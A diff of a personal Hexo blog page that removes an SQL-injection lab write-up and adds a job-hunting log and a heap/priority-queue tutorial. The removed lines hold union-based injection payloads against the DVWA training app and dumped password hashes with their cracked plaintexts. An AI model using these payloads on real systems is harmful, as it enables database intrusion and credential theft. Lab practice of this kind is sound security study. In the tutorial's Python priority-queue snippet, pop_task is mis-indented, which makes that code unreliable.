+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/21/一个弱鸡的找实习经历/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lintao Fang">
@@ -552,7 +569,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/04/13/未命名文件夹/SQL-injection/" itemprop="url">Untitled</a></h1>
+                <a class="post-title-link" href="/2018/04/21/一个弱鸡的找实习经历/" itemprop="url">一个弱鸡的找实习经历</a></h1>
         
 
         <div class="post-meta">
@@ -564,8 +581,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-13T17:22:43+08:00">
-                2018-04-13
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-21T00:38:43+08:00">
+                2018-04-21
               </time>
             
 
@@ -575,6 +592,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Job/" itemprop="url" rel="index">
+                    <span itemprop="name">Job</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -582,7 +621,7 @@
 
           
           
-             <span id="/2018/04/13/未命名文件夹/SQL-injection/" class="leancloud_visitors" data-flag-title="">
+             <span id="/2018/04/21/一个弱鸡的找实习经历/" class="leancloud_visitors" data-flag-title="一个弱鸡的找实习经历">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -615,34 +654,532 @@
       
         
           
-            <p>#Level 1</p>
-<p>##step1 嘗試</p>
+            <p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqixjir52oj30k40kidim.jpg" alt=""></p>
 <ul>
-<li>輸入1獲取姓名<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fqb57nlgmcj307n03aa9y.jpg" alt=""></li>
-<li><p>輸入 1 and 1=1<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fqb588adphj3075030mx2.jpg" alt=""></p>
+<li><p>4-2日投递：<br>爱奇艺（ Up主质量等级划分， 深度学习开发工程师-实习-）<br>优酷， （算法工程师-机器学习）<br>商汤     (见习算法开发工程师-暑期实习)，<br>去哪儿，（开发）<br>瓜子   (数据挖掘)<br>微众银行(NT-信息安全(数据挖掘方向))<br>顺丰，（大数据挖掘与分析实习生）<br>蘑菇街,<br>拼多多，(算法)<br>旷视，（暑期实习生<em>算法研究员）<br>百度，（商务搜索部</em>机器学习/数据挖掘实习工程师）<br>小米,<br>58转转（开发）<br>七牛云 （算法）<br>作业帮<br>滴滴POI（数据挖掘研发），地图事业部（算法）<br>51信用卡 （算法实习生）<br>cvte  (中央研究院 数据挖掘实习生)<br>虎牙 （数据挖掘实习生）  </p>
 </li>
-<li><p>輸入：<br>1’ and ‘1’ = ‘1<br>語法錯誤</p>
+<li><p>待投递：ebay PayPal 第四范式  </p>
 </li>
-<li>猜測無任何過濾</li>
-<li>觀察源代碼：的確無任何過濾<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fqb5edzjqjj30gm03ht93.jpg" alt="">  </li>
+<li><p>新笔试：<br>七牛云（算法）    4-13   （19：00）<br>今日头条 4-15 （10：00）<br>瓜子(数据挖掘) 4-15   (10:00)<br>58(开发)        4-15 （20：00）<br>微众银行   4-16 (19:00)<br>美团   4-20(19:00)  </p>
+</li>
 </ul>
-<p>##step2 獲取數據庫信息</p>
 <ul>
-<li>獲取數據庫名，輸入：1 union select 1 ,database()#  </li>
+<li>简历挂:<br>阿里，百度 ，滴滴，爱奇艺，优酷，商汤，拼多多，蘑菇街，小米，虎牙，快手，作业帮，去哪儿，顺丰  </li>
+<li><p>瓜子，微众银行待定 无结果</p>
+</li>
+<li><p>笔试挂:<br>微软，头条，华为，京东，美图，七牛云，58网易游戏 </p>
+</li>
 </ul>
-<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fqb5da6d5rj308q05cmxb.jpg" alt=""><br>獲取數據庫名稱為dvwa </p>
 <ul>
-<li>獲取表名，輸入：<br>1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fqb5lqj1z5j30ok0570tc.jpg" alt="">得知dvwa中由兩張表，guestbook,users</li>
-<li>獲取字段名，輸入：<br>1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fqb5q94o2ij30oa05ldgj.jpg" alt=""><br>字段名為<br>user_id,first_name,last_name,user,password,avatar</li>
+<li><p>笔试通过、收到面试: 艾耕（3-30），旷视(4-19) , 微软（4-26）<br>收到offer:艾耕</p>
+</li>
+<li><p>Face++ 面试</p>
+</li>
 </ul>
-<p>##step3 抓取密碼</p>
-<ul>
-<li>輸入<br>1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fqb5snhnz1j30pw0bggo1.jpg" alt=""><br>21232f297a57a5a743894a0e4a801fc3,e99a18c428cb38d5f260853678922e03,8d3533d75ae2c3966d7e0d4fcc69216b,0d107d09f5bbe40cade3de5c71e9e9b7,5f4dcc3b5aa765d61d8327deb882cf99<br>md5解碼后為：<br>admin,abc123,charley,letmein,password</li>
-</ul>
-<p>#Level 2<br>1’ and ‘1’ = ‘1<br><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fqb65kljksj307i034t8m.jpg" alt="">  </p>
-<p> 1’ union select 1 ,database()#<br> <img src="https://ws3.sinaimg.cn/large/006tNc79ly1fqb67qx26hj309n05bwen.jpg" alt=""><br> 源代碼<br> <img src="https://ws2.sinaimg.cn/large/006tNc79ly1fqb67aifg0j30ht05yjrz.jpg" alt=""><br> 1’ select 1, database()#<br> <img src="https://ws4.sinaimg.cn/large/006tNc79ly1fqb6baoy2hj30ar0693yt.jpg" alt=""><br> 1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #<br> <img src="https://ws1.sinaimg.cn/large/006tNc79ly1fqb69y6v1hj30u206ojsb.jpg" alt=""><br> 1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#<br>  <img src="https://ws4.sinaimg.cn/large/006tNc79ly1fqb6cynyp5j30ra06egmi.jpg" alt=""><br>  1’ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #<br>  <img src="https://ws3.sinaimg.cn/large/006tNc79ly1fqb6e09h6rj313q0g178d.jpg" alt=""><br>  1’ union select 1 , concat(user,password) from users#<br>  <img src="https://ws1.sinaimg.cn/large/006tNc79ly1fqb6g31pnaj30hz0dsgnt.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">1.讲讲自己用做的项目   </div><div class="line"> </div><div class="line">2.问熟悉哪些语言...python </div><div class="line">   </div><div class="line">python  is ==的区别？    </div><div class="line">python方法解析顺序    </div><div class="line">m*k   n*k两矩阵计算欧几里得距离np.tile？   </div><div class="line"> </div><div class="line">3.问上了哪些课？    </div><div class="line">elf 的 bss段？    </div><div class="line">ip报文经过一个路由器改变哪些字段？    </div><div class="line"></div><div class="line">4.Batch normalization ？    </div><div class="line">group convolution ？    </div><div class="line"></div><div class="line">5 .a,b~U[0,1]，互相独立    </div><div class="line">求Max(a,b) 期望</div></pre></td></tr></table></figure>
 
           
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/21/基于比较的的排序/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lintao Fang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Rat-racer's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/21/基于比较的的排序/" itemprop="url">基于比较的的排序</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-21T00:35:52+08:00">
+                2018-04-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/algorithms/" itemprop="url" rel="index">
+                    <span itemprop="name">algorithms</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/21/基于比较的的排序/" class="leancloud_visitors" data-flag-title="基于比较的的排序">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>Toaday I’m going to review some important sorting algorithms based on comparison.Besides,related data structures such as heap,priority queue will also be talked.</p>
+<pre><code>1 堆排序 &amp;&amp; 优先队列
+2 选择排序，插入排序，冒泡排序
+3 快速排序
+4 相关笔试题分析
+</code></pre><h3 id="1-堆排序-amp-amp-优先队列"><a href="#1-堆排序-amp-amp-优先队列" class="headerlink" title="1 堆排序 &amp;&amp; 优先队列"></a>1 堆排序 &amp;&amp; 优先队列</h3><pre><code>1 堆排序 &amp;&amp; 优先队列
+目录：
+1.1 什么是堆?    what and why?
+    1.1.1 what？
+    1.1.2 关于二叉堆 Binary Heap
+    1.1.3 why ? 
+1.2 堆的实现？什么二叉堆？   
+    1.2.0 什么是二叉堆？ binary heap?
+    1.2.1 堆的实现 二叉堆
+    1.2.2 斐波那契堆的实现
+    1.2.3 二项堆堆的实现
+1.3 堆的相关操作？ 堆排序？ 
+    1.3.1 Max-Heapify
+    1.3.2 Build-Max-Heap
+    1.3.3 HeapSort
+    1.3.4 关于优先队列の操作
+1.4 堆的优缺点? 堆排序分析.
+    1.4.1 堆的优缺点
+    1.4.2 性能分析
+1.5 优先队列 what and why? 堆与优先队列的关系？ 
+    1.5.1 什么是优先队列？Priority Queue
+    1.5.2 为什么是要使用优先队列？ why?
+    1.5.3 Links between Heap and Priority Queue ?
+1.6 优先队列的实现 性能分析？
+     1.6.1 Naive Implementation
+    1.6.2 Usual Implementation
+    1.6.3 Specialized Heaps Implementation
+    1.6.4 性能分析
+1.7 Java，Python中的Heap，Priority Queue的实现
+    1.7.1 Java中的实现
+    1.7.2 Python中的实现
+1.8 References &amp; Externel Links
+    1.8.1 References
+    1.8.2 Externel Links
+</code></pre><p>In this Section,we’ll go deeply to reveal concrete definitions of Heap,Binary Heap,and Priority Queue and difference between them.<br>Basic Concepts and Methods will also be talked but not that  specifically.</p>
+<h5 id="1-1-什么是堆？Heap"><a href="#1-1-什么是堆？Heap" class="headerlink" title="1.1  什么是堆？Heap?"></a>1.1  什么是堆？Heap?</h5><h5 id="1-1-1-what？"><a href="#1-1-1-what？" class="headerlink" title="1.1.1 what？"></a>1.1.1 what？</h5><p>很多人以为<br>堆 == 二叉堆 == 优先队列   他们之间的关系真的是相等的吗？   [Conclusion at section 1.5.3]   </p>
+<p>在英语中，heap作为动词 <strong>把..堆起/使成堆</strong> 的意思。作为名词是<strong>堆/很多</strong>的意思。<br>1964年，J. W. J. Williams 发明了堆排序(Heap Sort)<sup>[1]</sup>，同时描述了如何利用二叉堆来实现一个优先队列。 使用该种数据结构可以高效的获取队列中的最大值或者最小值，从而进行排序操作。<br>（关于二叉堆见1.2,什么是优先队列见1.4 ）</p>
+<p>之后，后人不断加以改进，产生了一系列不同的堆.<br>比如k-叉堆，斐波那契堆，二项堆，左式堆，斜堆等等。  见<a href="https://en.wikipedia.org/wiki/Heap_(data_structure" target="_blank" rel="external">堆变体</a>#Variants)。  </p>
+<p>从最初William的二叉堆用于堆排序，到后来的各式各样的堆，基本都是以树的形式表示。因此说    </p>
+<p>  <strong>堆是一共基于树的数据结构</strong>。</p>
+<p>  维基百科也有说：A heap is a <strong>specialized tree-based data structure</strong> that satisfies the heap property。<br>  所谓的heap property(堆的性质)即是大根堆/小跟堆的性质(所有父节点≥/≤子节点)。   </p>
+<p>  因此，亦可以说堆不是一个数据结构，而是一类数据结构[this is my personal opinion]。</p>
+<h5 id="1-1-2-关于二叉堆-Binary-Heap"><a href="#1-1-2-关于二叉堆-Binary-Heap" class="headerlink" title="1.1.2 关于二叉堆 Binary Heap"></a>1.1.2 关于二叉堆 Binary Heap</h5><p>  <strong>二叉堆是一种堆</strong>。  </p>
+<p>  维基百科上说：<br>  A binary heap is <strong>a heap data structure</strong> that takes the form of a binary tree. Binary heaps are a common way of implementing priority queues.[2]</p>
+<p> 显而易见的，将堆与二叉堆划等号（堆heap == 二叉堆bianry heap），显然是一个不成熟的想法。  </p>
+<p>heap != bianry heap,that is to say , heap is a class of data structures.but binay heap is a common type of heap.  </p>
+<p>它们与优先队列的关系将会在1.4中简要探讨。</p>
+<h5 id="1-1-3-why"><a href="#1-1-3-why" class="headerlink" title="1.1.3 why ?"></a>1.1.3 why ?</h5><p>既然知道了什么是堆，那么为什么要用堆呢？williams为什么要引入它呢。它又有哪些优点呢。<br>我认为，对于传统的大根堆或者小跟堆而言，最大值/最小值分别处于root节点位置.(为什么？)<br>这方便我们从中读/取最大值，最小值，这是一个O(logn)的操作。相对于数组而言，这有显著的性能提升。因此堆适用于那些需要频繁取最大/最小值的应用。  </p>
+<h4 id="1-2-堆的实现？什么二叉堆？"><a href="#1-2-堆的实现？什么二叉堆？" class="headerlink" title="1.2 堆的实现？什么二叉堆？"></a>1.2 堆的实现？什么二叉堆？</h4><p>堆采用树结构实现。对于不同的堆有不同的树实现。  </p>
+<h5 id="1-2-0-什么是二叉堆"><a href="#1-2-0-什么是二叉堆" class="headerlink" title="1.2.0 什么是二叉堆"></a>1.2.0 什么是二叉堆</h5><p>二叉堆是一种堆，二叉堆广泛地被使用，以至于，当我们谈论堆时，通常默认指的就是二叉堆。<br>二叉堆也是优先队列的一种常见的实现。 （什么是优先队列见1.4 ）</p>
+<p>二叉堆基于二叉树是实现，除了是二叉树之外，还需要满足下面两个条件。<br>1.Shape property :一个二叉堆是一个完全二叉树。在此含义即是所有的层（除了最后一层）都是满的，只有最后一层不是满的，而且最后一层的节点从左向右依次填充。<br>2.Heap property: （大根堆）对于所有的父亲节点而言，其值≥子节点。<br>    （小根堆）对于所有的父亲节点而言，其值≤ 子节点。  【注意可以等于】</p>
+<h5 id="1-2-1-二叉堆的实现"><a href="#1-2-1-二叉堆的实现" class="headerlink" title="1.2.1 二叉堆的实现"></a>1.2.1 二叉堆的实现</h5><p>对于最常见的二叉堆：<br>他使用二叉树来实现，这个二叉树是一个完全二叉树(完全二叉树在不同的文献中有着不同的含义，在此处我们取所有的层（除了最后一层）都是满的，只有最后一层不是满的，而且最后一层的节点从左向右依次填充。见<a href="https://en.wikipedia.org/wiki/Binary_tree" target="_blank" rel="external">维基百科-完全二叉树</a>)  </p>
+<p>逻辑上，二叉堆是一棵树。  物理上，二叉堆常用数组来实现。而不需要指针。这样可以获得较好的性能。(考虑为什么可以？)  </p>
+<p>如下图所示：<br>逻辑结构：<br><img src="https://img-blog.csdn.net/20161201154351701" alt=""><br>物理结构：<br><img src="https://img-blog.csdn.net/20161201155126086" alt=""></p>
+<h5 id="1-2-2-斐波那契堆的实现"><a href="#1-2-2-斐波那契堆的实现" class="headerlink" title="1.2.2 斐波那契堆的实现"></a>1.2.2 斐波那契堆的实现</h5><p>待续</p>
+<h5 id="1-2-3-二项堆的实现"><a href="#1-2-3-二项堆的实现" class="headerlink" title="1.2.3 二项堆的实现"></a>1.2.3 二项堆的实现</h5><p>待续</p>
+<h4 id="1-3-堆的相关操作？-堆排序？"><a href="#1-3-堆的相关操作？-堆排序？" class="headerlink" title="1.3 堆的相关操作？   堆排序？"></a>1.3 堆的相关操作？   堆排序？</h4><p>对于不同的heap，我们有不同的操作，在此，我们先对最为广泛的二叉堆进行阐述。<br>【本部分主要采自算法导论第三版 &amp;&amp; 只针对大根堆（小根同理）】<br>【注：大根堆 == 最大堆，小根堆 == 最小堆】</p>
+<ul>
+<li>Max-Heapify 维护大根堆的性质。O(log n)</li>
+<li>Build-Max-Heap 从无序的输入数据数组中构造一个大根堆。 O(n) </li>
+<li>HeapSort O(nlog n ) 对一个数组进行[原址]排序。</li>
+<li>Max-Heap-Insert,Heap-Extract-Max,Heap-Increase-Key,Heap-Maximum【O(1)】过程、时间复杂度均为O(log n )功能是利用二叉堆实现一个优先队列。 </li>
+</ul>
+<p>【此处只是列出了算法伪代码以及算法思想，比较晦涩，最好还是找到具体的例子(譬如算法导论上就可以找到)，配合算法，会有更加深刻的理解，此处限于篇幅就不做举例了】</p>
+<h5 id="1-3-1-Max-Heapify"><a href="#1-3-1-Max-Heapify" class="headerlink" title="1.3.1 Max-Heapify"></a>1.3.1 Max-Heapify</h5><p>Max-Heapify(A,i) 自顶向下维护大根堆性质。 O(log n)<br><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqjp4ykkzdj30fp0abwfy.jpg" alt="">  </p>
+<h5 id="1-3-2-Build-Max-Heap"><a href="#1-3-2-Build-Max-Heap" class="headerlink" title="1.3.2 Build-Max-Heap"></a>1.3.2 Build-Max-Heap</h5><p>Build-Max-Heap(A)  从最后一个非叶子节点开始，到根节点一次调用Max-Heapify(A,i)<br><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fqjp7f20upj30cj045wex.jpg" alt=""><br>【此算法的复杂度是O(n) 而不是O(n log n)试想为什么？】【算法导论上有证明】   </p>
+<h5 id="1-3-3-HeapSort"><a href="#1-3-3-HeapSort" class="headerlink" title="1.3.3 HeapSort"></a>1.3.3 HeapSort</h5><p>HeapSort(A)  O(n log n )<br>思想：<br>每次从root节点取出最大值，然后调整。<br>即：<br>从最后一个节点开始，将其调换A<a href="最大值">1]</a>，将脱离堆，从根节点开始调整堆。<br><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fqjpbnwuryj30ei0713z7.jpg" alt=""></p>
+<h5 id="1-3-4-优先队列の操作"><a href="#1-3-4-优先队列の操作" class="headerlink" title="1.3.4 优先队列の操作"></a>1.3.4 优先队列の操作</h5><p>Max-Heap-Insert,Heap-Extract-Max,Heap-Increase-Key,Heap-Maximum【O(1)】过程、时间复杂度均为O(log n )功能是利用二叉堆实现一个优先队列。<br>these operations are implemented to implement a priority queue.<br>the operations above ,i.e. Max-Heapify,Build-Max-Heap ,HeapSort are enough for heapsort.  </p>
+<ul>
+<li>Max-Heap-Insert,在大根堆中插入一个元素并调整之</li>
+<li>Heap-Extract-Max,取出最大值即根节点，然后调整之</li>
+<li>Heap-Increase-Key,将某个节点增加一定的值，然后调整之</li>
+<li>Heap-Maximum，返回根节点的值</li>
+</ul>
+<h4 id="1-4-堆的优缺点-堆排序分析"><a href="#1-4-堆的优缺点-堆排序分析" class="headerlink" title="1.4 堆的优缺点? 堆排序分析."></a>1.4 堆的优缺点? 堆排序分析.</h4><h4 id="1-5-堆与优先队列的关系？-优先队列what-and-why"><a href="#1-5-堆与优先队列的关系？-优先队列what-and-why" class="headerlink" title="1.5 堆与优先队列的关系？ 优先队列what and why?"></a>1.5 堆与优先队列的关系？ 优先队列what and why?</h4><h5 id="1-5-1-什么是优先队列？Priority-Queue"><a href="#1-5-1-什么是优先队列？Priority-Queue" class="headerlink" title="1.5.1 什么是优先队列？Priority Queue"></a>1.5.1 什么是优先队列？Priority Queue</h5><p>优先队列是一种类似于队列的数据结构。<br>熟悉数据结构的我们知道，队列是一种允许在一段进行插入(入队)以及另一端进行删除(出队)的数据结构。 它是一种FIFO类型的数据结构。 队列在很多方面都有很多应用，比如在cache(替换策略),进程/作业调度方面。  </p>
+<p>而，在很多情况下，我们需要考虑不同元素的优先权不同，譬如在操作系统调度中，有一种叫做SJF的算法(即最短作业有限),在此，优先级就是执行作业的用时长短。这种情况下，用基本的先入先出的队列就不能胜任了。<br>因此，引入了一种叫做优先队列(Priority Queue )的数据结构。<br>优先队列中的每一个节点都有对应的优先级。 在不同的应用中采用不同的指标作为优先级。   </p>
+<ul>
+<li>优先队列满足至少以下两种操作<sup>[4]</sup><ul>
+<li>Insert  插入/入队 将一个节点插入到优先队列</li>
+<li>Deelete Min/Max      删除最小值/最大值，或者称之为Min/Max出队.</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>其实可以将Stack,Queue作为优先队列的两种特殊情况(为什么？)</li>
+<li>也可以将优先队列看做为队列的一种修改，当出队时，总是出优先级最大/小的节点。</li>
+</ul>
+<h5 id="1-5-2-为什么是要使用优先队列？-why"><a href="#1-5-2-为什么是要使用优先队列？-why" class="headerlink" title="1.5.2 为什么是要使用优先队列？ why?"></a>1.5.2 为什么是要使用优先队列？ why?</h5><p>引入了优先队列，可以方便的执行插入以及取最大/最小值的操作。在很多应用中，这两种操作频繁出现。</p>
+<ul>
+<li>我认为优先队列<ul>
+<li>一方面，其插入,取最大/最小值操作在很多应用中频繁使用，满足了这些应用的需求。</li>
+<li>另一方面，使用堆来实现的优先队列具有很好的性能。这使得我们更加倾向于使用它们。(关于性能见1.5)</li>
+</ul>
+</li>
+</ul>
+<p>维基百科上列举了优先队列的一些重要应用<sup>[3]</sup>：</p>
+<pre><code>Bandwidth management
+Discrete event simulation
+Dijkstra&apos;s algorithm
+Huffman coding
+Best-first search algorithms
+ROAM triangulation algorithm
+Prim&apos;s algorithm for minimum spanning tree
+</code></pre><h5 id="1-5-3-Links-between-Heap-and-Priority-Queue"><a href="#1-5-3-Links-between-Heap-and-Priority-Queue" class="headerlink" title="1.5.3 Links between Heap and Priority Queue ?"></a>1.5.3 Links between Heap and Priority Queue ?</h5><p>优先队列常使用堆Heap来实现，但是优先队列与堆在概念上是不同的。<br>优先队列是一种抽象数据结构ADT(逻辑上)，它可以有很多实现(物理上)，譬如堆，数组，链表等。<br>但是<strong>最常见且最高效</strong>的实现是采用堆来实现。   </p>
+<p>到目前为止，我们理清了三者之间的关系。<br>so  堆 != 二叉堆 != 优先队列 != 堆<br><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fqkaogd2h9j30ew06o75c.jpg" alt=""><br>Heap : 二叉堆，k-叉堆，二项堆，斐波那契堆，斜堆，etc..<br>PQ : Priority Queue(ADT) 。Many kinds of Implementations<br><strong>二叉堆是堆的一种，常用于实现优先队列。</strong></p>
+<h4 id="1-6-优先队列的实现-性能分析？"><a href="#1-6-优先队列的实现-性能分析？" class="headerlink" title="1.6 优先队列的实现 性能分析？"></a>1.6 优先队列的实现 性能分析？</h4><h5 id="1-6-1-Naive-Implementation"><a href="#1-6-1-Naive-Implementation" class="headerlink" title="1.6.1  Naive Implementation"></a>1.6.1  Naive Implementation</h5><p>有很多非常simple的实现优先队列的方法，比如无序列表Unordered List。<br>尽管Simple，但是性能却<strong>不佳</strong>。对于无序列表而言，插入操作是O(1)的，出队Extract-Min/Max 却是O（n）的，因为要搜索整个列表。  </p>
+<h5 id="1-6-2-Usual-Implementation"><a href="#1-6-2-Usual-Implementation" class="headerlink" title="1.6.2 Usual Implementation"></a>1.6.2 Usual Implementation</h5><p>为了提高性能，堆被引入作为实现。<br>普通的二叉堆具有O(log n )的performance for inserts and removals。<br>and O(n) to build initially。<br>普通二叉堆的变体，斐波那契堆， pairing heaps提供了更好的性能。 </p>
+<h5 id="1-6-3-Specialized-Heaps-Implementation"><a href="#1-6-3-Specialized-Heaps-Implementation" class="headerlink" title="1.6.3 Specialized Heaps Implementation"></a>1.6.3 Specialized Heaps Implementation</h5><p>有一些特殊的堆结构，可以提供附加一些的操作(除1.5.1中的两种),或者在一些特殊的数据类型上性能优于普通的堆。<br>见[3]</p>
+<h5 id="1-6-4-性能分析"><a href="#1-6-4-性能分析" class="headerlink" title="1.6.4 性能分析"></a>1.6.4 性能分析</h5><p>下图为采用不同的堆作为优先队列时，相关操作的时间复杂度。【此为最小堆】<br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fqk7tyztq7j30rk05amyp.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fqk7v8i14jj311r03j3z4.jpg" alt=""><br>【采自维基百科，注释略之】</p>
+<h4 id="1-7-Java，Python中的Heap，Priority-Queue的实现"><a href="#1-7-Java，Python中的Heap，Priority-Queue的实现" class="headerlink" title="1.7 Java，Python中的Heap，Priority Queue的实现"></a>1.7 Java，Python中的Heap，Priority Queue的实现</h4><h5 id="1-7-1-Java中的实现"><a href="#1-7-1-Java中的实现" class="headerlink" title="1.7.1 Java中的实现"></a>1.7.1 Java中的实现</h5><p>Class PriorityQueue </p>
+<h5 id="1-7-2-Python中的实现"><a href="#1-7-2-Python中的实现" class="headerlink" title="1.7.2 Python中的实现"></a>1.7.2 Python中的实现</h5><p>heapq模块实现了二叉堆的功能,可以用来实现优先队列以及Heapsort。<br>为Min-Heap.且下标从0开始。</p>
+<ul>
+<li>API<ul>
+<li>Heapify() 给定一List,原地 线性 将其变为最小堆。</li>
+<li>Heappop() 从堆中pop最小值，即索引[0]所在元素。</li>
+<li>Heappush() 向插入一个元素。</li>
+</ul>
+</li>
+<li>用例<ul>
+<li><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fqk8st2mxmj307e06p3yv.jpg" alt=""></li>
+</ul>
+</li>
+<li>此外还提供了<br>  heapq.nlargest, heapq.nsmallest 用来返回n个最大/最小的元素。</li>
+</ul>
+<h5 id="实现HeapSort"><a href="#实现HeapSort" class="headerlink" title="实现HeapSort"></a>实现HeapSort</h5><pre><code>def heapsort(iterable):
+   h = []
+   for value in iterable:
+     heappush(h, value)
+   return [heappop(h) for i in range(len(h))]
+
+ &gt;&gt;&gt; heapsort([1, 3, 5, 7, 9, 2, 4, 6, 8, 0])
+ &gt;&gt;&gt; [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
+</code></pre><h5 id="实现优先队列"><a href="#实现优先队列" class="headerlink" title="实现优先队列"></a>实现优先队列</h5><pre><code>pq = []                         # list of entries arranged in a heap
+entry_finder = {}               # mapping of tasks to entries
+REMOVED = &apos;&lt;removed-task&gt;&apos;      # placeholder for a removed task
+counter = itertools.count()     # unique sequence count
+
+def add_task(task, priority=0):
+    &apos;Add a new task or update the priority of an existing task&apos;
+    if task in entry_finder:
+        remove_task(task)
+    count = next(counter)
+    entry = [priority, count, task]
+    entry_finder[task] = entry
+    heappush(pq, entry)
+
+def remove_task(task):
+    &apos;Mark an existing task as REMOVED.  Raise KeyError if not found.&apos;
+    entry = entry_finder.pop(task)
+    entry[-1] = REMOVED
+
+    def pop_task():
+&apos;Remove and return the lowest priority task. Raise KeyError if empty.&apos;
+    while pq:
+        priority, count, task = heappop(pq)
+        if task is not REMOVED:
+            del entry_finder[task]
+            return task
+    raise KeyError(&apos;pop from an empty priority queue&apos;)
+</code></pre><h5 id="最大堆的实现"><a href="#最大堆的实现" class="headerlink" title="最大堆的实现"></a>最大堆的实现</h5><p>待续<br><a href="https://stackoverflow.com/questions/14189540/python-topn-max-heap-use-heapq-or-self-implement" target="_blank" rel="external">ref</a></p>
+<h4 id="1-8-References-amp-Externel-Links"><a href="#1-8-References-amp-Externel-Links" class="headerlink" title="1.8 References &amp; Externel Links"></a>1.8 References &amp; Externel Links</h4><h5 id="1-8-1-References"><a href="#1-8-1-References" class="headerlink" title="1.8.1 References"></a>1.8.1 References</h5><p>[1] : Williams, J. W. J. (1964), “Algorithm 232 - Heapsort”, Communications of the ACM, 7 (6): 347–348</p>
+<p>[2] :<a href="https://en.wikipedia.org/wiki/Binary_heap" target="_blank" rel="external">维基百科-二叉堆</a></p>
+<p>[3] :<a href="https://en.wikipedia.org/wiki/Priority_queue" target="_blank" rel="external">维基百科-优先队列</a></p>
+<p>[4] : 《数据结构与算法分析 C语言实现》 Weiss Chapter 6</p>
+<h5 id="1-8-2-Externel-Links"><a href="#1-8-2-Externel-Links" class="headerlink" title="1.8.2 Externel Links"></a>1.8.2 Externel Links</h5><p><a href="https://www.coder4.com/archives/3844" target="_blank" rel="external">Python使用heapq实现小顶堆（TopK大）、大顶堆（BtmK小）</a></p>
+<p><a href="https://blog.csdn.net/minxihou/article/details/51850001" target="_blank" rel="external">利用Python实现堆排序</a></p>
